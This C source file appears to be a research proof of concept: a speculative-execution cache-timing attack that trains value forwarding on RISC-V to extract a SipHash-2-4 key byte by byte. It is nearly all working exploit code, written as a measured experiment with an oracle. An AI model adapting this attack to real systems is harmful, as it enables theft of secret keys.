/*
 * Layer 5 - Real-library target: SipHash-2-4 key extraction.
 *
 * The library below is Marek Majkowski's csiphash (the widely used reference
 * siphash24(const void *, unsigned long, const <byte> key[16]) implementation),
 * included essentially verbatim:
 *   - the key parameter type is uint8_t instead of char / unsigned char,
 *   - the `_le64toh` conversions are elided (they are the identity on the
 *     little-endian RISC-V target),
 *   - a `noinline, noclone, noipa` attribute is added so that the measurement
 *     sees a real call boundary and GCC cannot constant-propagate
 *     src_sz == 0 and delete the reference implementation's own tail loads.
 * The algorithm itself is untouched.
 *
 * Threat model / measurement design (see experiment/egdiff_eval/RESULTS_step2.md):
 *   - siphash24(.., src_sz = 0, key) loads the two 64-bit key words with
 *     `ld k0, 0(key)` and `ld k1, 8(key)` (verified with objdump).  With an
 *     empty message it then executes only fixed constant-pool loads and one
 *     jump-table load before returning, so k0 and k1 sit at *fixed* dynamic
 *     load distances from the caller's next load `L_atk`.
 *   - The attacker's own load `atk_load` is one static instruction; it is used
 *     both for offline training and for the measurement.
 *   - Training uses a "carrier" load whose value equals L_atk's value and which
 *     sits exactly d dynamic loads earlier; every other load in the training
 *     body varies per iteration.  Hence d is the *only* distance whose
 *     difference is constant, and distance polling walks 32 -> ... -> d and
 *     latches diff = 0 there.  No other distance can trap the poller.
 *   - At measurement, L_atk's address is delayed by a register-only division
 *     chain, so its data access (and therefore verification + squash) happens
 *     long after dispatch, while the dependent probe load issues immediately
 *     with the forwarded key word.
 *   - The architectural (post-squash) value is a sentinel; the probe routes it
 *     to a dedicated slot outside the 256 measured lines, so the architectural
 *     re-execution can never be mistaken for the speculative fill.
 *   - A byte is accepted only if the fastest line wins by MARGIN cycles and
 *     holds a strict majority of the informative attempts, and only if the
 *     architectural precondition (the load returned the sentinel, the key
 *     array is intact and the tag is reproducible) holds.
 */

#include <stdint.h>
#include <stdio.h>
#include <string.h>

/* Target value, SipHash implementation and oracle live in eggdiff_secret.c. */
extern uint64_t victim_tag(void);
extern int oracle_report_key(uint64_t rk0, uint64_t rk1, int bytes,
                             int votes, int total_votes, int arch_ok,
                             uint64_t sink);

/* ======================================================================== */
/* SipHash-2-4 reference implementation (majek/csiphash, MIT licence).       */
/* ======================================================================== */
/* ======================================================================== */
/* Measurement harness.                                                     */
/* ======================================================================== */

#define LINE      64
#define LINES     256                 /* measured lines per probe          */
#define SLOTS     (LINES + 1)         /* slot LINES = architectural sentinel */
#define PROBE_SZ  (SLOTS * LINE)
#define MARGIN    20                  /* cycles a winner must beat 2nd by  */
#ifndef REPS
#define REPS      5                   /* informative measurements / byte   */
#endif
#ifndef TRAIN
#define TRAIN     320                 /* training-loop iterations          */
#endif
#define FLUSH_SZ  (64 * 1024)

/* Distances measured with objdump (see RESULTS_step2.md):
 *   k1 is the load 5 dynamic loads before the caller's next load,
 *   k0 is the load 6 dynamic loads before it.  Both <= ORDER_N = 32. */
#define DIST_K1   5
#define DIST_K0   6

#define SENTINEL  0xAAAAAAAAAAAAAAAAULL


static uint8_t probe[PROBE_SZ] __attribute__((aligned(LINE)));
static volatile uint64_t atk_buf[64] __attribute__((aligned(LINE)));
static volatile uint64_t carry_buf[8];

/* Distinct static load instructions (distinct PCs) for the varying filler. */
static volatile uint64_t noiseA[64], noiseB[64], noiseC[64], noiseD[64],
    noiseE[64], noiseF[64], noiseG[64];

static volatile uint8_t flushbuf[FLUSH_SZ];

static uint64_t g_sink;

static inline uint64_t
rdcycle(void)
{
    uint64_t c;
    asm volatile("csrrs %0, cycle, x0" : "=r"(c) :: "memory");
    return c;
}

/* The attacker's load: one static PC for training and for the measurement.
 * The base is an argument so that addressing a global never inserts a hidden
 * load between the library's key load and this load. */
__attribute__((noinline, noclone))
static uint64_t
atk_load(volatile uint64_t *base, uint64_t idx)
{
    return base[idx & 63];
}

static uint64_t
mix(uint64_t x)
{
    x += 0x9E3779B97F4A7C15ULL;
    x = (x ^ (x >> 30)) * 0xBF58476D1CE4E5B9ULL;
    x = (x ^ (x >> 27)) * 0x94D049BB133111EBULL;
    return x ^ (x >> 31);
}

/* Delay L_atk's address by a register-only division chain and then issue the
 * load.  This lives in its own small noinline function so that the base
 * address is materialised with a gp-relative add *inside* it (after the
 * SipHash call) instead of being reloaded from a stack spill between the key
 * load and L_atk.  `z` is opaque to the compiler, so every division is real;
 * the resulting index is arbitrary but every atk_buf word holds SENTINEL. */
__attribute__((noinline, noclone, noipa))
static uint64_t
delayed_atk_load(uint64_t tag)
{
    uint64_t z = (tag | 1) & 0xffffff;
    asm volatile("" : "+r"(z));
    uint64_t x = z;
    x /= (z + 2);
    x /= (z + 3);
    x /= (z + 4);
    x /= (z + 5);
    x /= (z + 6);
    x /= (z + 7);
    x /= (z + 8);
    x /= (z + 9);
    x /= (z + 10);
    x /= (z + 11);
    x /= (z + 12);
    x /= (z + 13);
    return atk_load(atk_buf, x);
}

static void
flush_l1(void)
{
    for (int i = 0; i < FLUSH_SZ; i += LINE)
        (void)flushbuf[i];
}

/* Training bodies.  The important relation is only that the carrier load C
 * sits exactly d dynamic loads before L_atk and that both load the same value:
 *
 *   d=5:  ... C X Y Z W L
 *   d=6:  ... C X Y Z W V L
 *
 * Every load except C and L takes an independently varying value, so no other
 * distance in [1,32] has a constant difference.  GCC additionally hoists the
 * loop-invariant 64-bit mix constants into a few stack slots and reloads them
 * each iteration; those extra loads are constant-valued, but their difference
 * is (mix(i) - const), which varies, so they are *not* fixed points either. */
__attribute__((noinline, noclone))
static void
train_d5(uint64_t *sinkp)
{
    uint64_t s = *sinkp;
    for (int i = 0; i < TRAIN; i++) {
        uint64_t v = mix((uint64_t)i);
        int k = i & 63;
        s += noiseA[k];
        s += noiseB[k];
        carry_buf[0] = v;
        s += carry_buf[0];       /* carrier, distance 5 from L_atk */
        s += noiseC[k];
        s += noiseD[k];
        s += noiseE[k];
        s += noiseF[k];
        s += atk_load(carry_buf, 0);
    }
    *sinkp = s;
}

__attribute__((noinline, noclone))
static void
train_d6(uint64_t *sinkp)
{
    uint64_t s = *sinkp;
    for (int i = 0; i < TRAIN; i++) {
        uint64_t v = mix((uint64_t)i);
        int k = i & 63;
        s += noiseA[k];
        s += noiseB[k];
        carry_buf[0] = v;
        s += carry_buf[0];       /* carrier, distance 6 from L_atk */
        s += noiseC[k];
        s += noiseD[k];
        s += noiseE[k];
        s += noiseF[k];
        s += noiseG[k];
        s += atk_load(carry_buf, 0);
    }
    *sinkp = s;
}

static void
train(int dist)
{
    if (dist == DIST_K1)
        train_d5(&g_sink);
    else
        train_d6(&g_sink);
}

/* Latency of each of the LINES measured lines; finds the fastest and the
 * runner-up.  Returns the fastest index, and their latencies. */
static int
scan_region(int *bestlat_out, int *secondlat_out)
{
    int best = -1;
    uint64_t bestlat = ~0ULL, secondlat = ~0ULL;

    for (int k = 0; k < LINES; k++) {
        volatile uint8_t *q = probe + (size_t)k * LINE;
        uint64_t t1 = rdcycle();
        uint8_t v = *q;
        asm volatile("" :: "r"(v) : "memory");
        uint64_t t2 = rdcycle();
        uint64_t lat = t2 - t1;
        if (lat < bestlat) {
            secondlat = bestlat;
            best = k;
            bestlat = lat;
        } else if (lat < secondlat) {
            secondlat = lat;
        }
    }
    *bestlat_out = (int)bestlat;
    *secondlat_out = (int)secondlat;
    return best;
}

/* Recover one byte (lane `b`) of the word forwarded from dynamic distance
 * `dist`.  Returns the byte, or -1 if no confident measurement was obtained.
 * *votes_out = number of attempts that produced a confident margin,
 * *arch_ok_out = architectural precondition. */
static int
measure_byte(int dist, int b, int *votes_out, int *arch_ok_out)
{
    int score[LINES];
    int votes = 0, arch_ok = 1;

    for (int k = 0; k < LINES; k++)
        score[k] = 0;

    for (int attempt = 0; attempt < REPS; attempt++) {
        /* Evict the probe array and the attack buffer.  Then train, and finally
         * touch the key line: that load executes *before* the SipHash call, so
         * it cannot appear between the key load and L_atk, but it guarantees
         * the key is L1-resident and therefore already available (committed or
         * SpecGVQ-avail) when L_atk is renamed -- the value is forwarded
         * immediately instead of racing a deferred wake. */
        flush_l1();
        train(dist);
        g_sink += victim_tag() & 1;

        /* Single SipHash call with an empty message: k0 and k1 are the last
         * key loads and there is no message load. */
        uint64_t tag = victim_tag();

        /* The register-only division chain inside delayed_atk_load delays
         * L_atk's address, so its data access (verification + squash) happens
         * long after dispatch while the dependent probe issues immediately. */
        uint64_t val = delayed_atk_load(tag);

        if (val != SENTINEL || atk_buf[0] != SENTINEL)
            arch_ok = 0;

        /* Dependent probe.  The speculative path uses the forwarded key byte;
         * the post-squash architectural path (val == SENTINEL) uses the
         * reserved slot LINES, outside the measured range. */
        uint64_t byte = (val >> (8 * b)) & 0xff;
        uint64_t slot = (val == SENTINEL) ? (uint64_t)LINES : byte;
        volatile uint8_t *q = probe + (size_t)slot * LINE;
        g_sink += *q;

        int bestlat, secondlat;
        int best = scan_region(&bestlat, &secondlat);
        if (best >= 0 && bestlat + MARGIN < secondlat) {
            score[best]++;
            votes++;
        }
#ifdef DIAG
        fprintf(stderr,
                "DIAG dist=%d b=%d val=%016llx best=%d bestlat=%d "
                "secondlat=%d margin=%d voted=%d\n",
                dist, b, (unsigned long long)val, best, bestlat, secondlat,
                secondlat - bestlat, (int)(best >= 0 && bestlat + MARGIN < secondlat));
#endif
    }

    int leak = -1, max = 0, second = 0;
    for (int k = 0; k < LINES; k++) {
        if (score[k] > max) {
            second = max;
            max = score[k];
            leak = k;
        } else if (score[k] > second) {
            second = score[k];
        }
    }
    /* Strict majority of the informative attempts, and a real winner. */
    if (max == 0 || max <= second)
        leak = -1;

    *votes_out = votes;
    *arch_ok_out = arch_ok;
#ifdef DIAG
    fprintf(stderr, "BYTE dist=%d b=%d leak=%d votes=%d arch=%d\n", dist, b,
            leak, votes, arch_ok);
#endif
    return leak;
}

static uint64_t
measure_word(int dist, int *arch_ok_out, int *votes_out, int *accepted_out)
{
    uint64_t word = 0;
    int arch_ok = 1, votes = 0, accepted = 0;

    for (int b = 0; b < 8; b++) {
        int v, a;
        int byte = measure_byte(dist, b, &v, &a);
        votes += v;
        arch_ok &= a;
        if (byte >= 0) {
            word |= ((uint64_t)(uint8_t)byte) << (8 * b);
            accepted++;
        }
    }
    *arch_ok_out = arch_ok;
    *votes_out = votes;
    *accepted_out = accepted;
    return word;
}

int
main(void)
{
    for (int k = 0; k < 64; k++)
        atk_buf[k] = SENTINEL;
    for (int i = 0; i < 64; i++) {
        noiseA[i] = mix((uint64_t)i + 0x11);
        noiseB[i] = mix((uint64_t)i + 0x22);
        noiseC[i] = mix((uint64_t)i + 0x33);
        noiseD[i] = mix((uint64_t)i + 0x44);
        noiseE[i] = mix((uint64_t)i + 0x55);
        noiseF[i] = mix((uint64_t)i + 0x66);
        noiseG[i] = mix((uint64_t)i + 0x77);
    }
    memset(probe, 0, sizeof(probe));

    /* Reference sanity: the tag must be reproducible and key-dependent. */
    uint64_t tag_a = victim_tag();
    uint64_t tag_b = victim_tag();

    int a1 = 0, v1 = 0, n1 = 0;
    uint64_t got_k1 = measure_word(DIST_K1, &a1, &v1, &n1);
    int a0 = 0, v0 = 0, n0 = 0;
    uint64_t got_k0 = measure_word(DIST_K0, &a0, &v0, &n0);

    int arch_ok = a1 && a0 && (tag_a == tag_b) &&
                  (atk_buf[0] == SENTINEL);

    printf("siphash_attack d_k1=%d d_k0=%d\n", DIST_K1, DIST_K0);
    return oracle_report_key(got_k0, got_k1, n0 + n1, v0 + v1,
                             2 * 8 * REPS, arch_ok, g_sink);
}
